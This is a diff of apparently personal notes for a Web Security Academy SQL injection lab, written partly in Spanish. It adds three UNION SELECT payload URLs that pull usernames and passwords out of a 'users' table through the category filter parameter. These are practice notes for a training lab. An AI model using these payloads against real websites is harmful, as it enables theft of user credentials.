@@ -108,9 +108,14 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT c
     ### [DUMP = Columns = 1. password]
     ### [DUMP = Columns = 1. username]
 
+# Dump Data:
 
-
-
+## Opt1 - Dump "username" + "password" (usando ambos campos sin GROUP_CONCAT ni CONCAT)
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT username,password FROM users -- -
+## Opt2 - Dump "username" + "password" (CONCAT)
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',concat(username,' ::: ',password) FROM users -- -
+## Opt3 - Dump "username" + "password" (CONCAT)
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT concat(username,' ::: ',password),'2' FROM users -- -
 ````
 
 
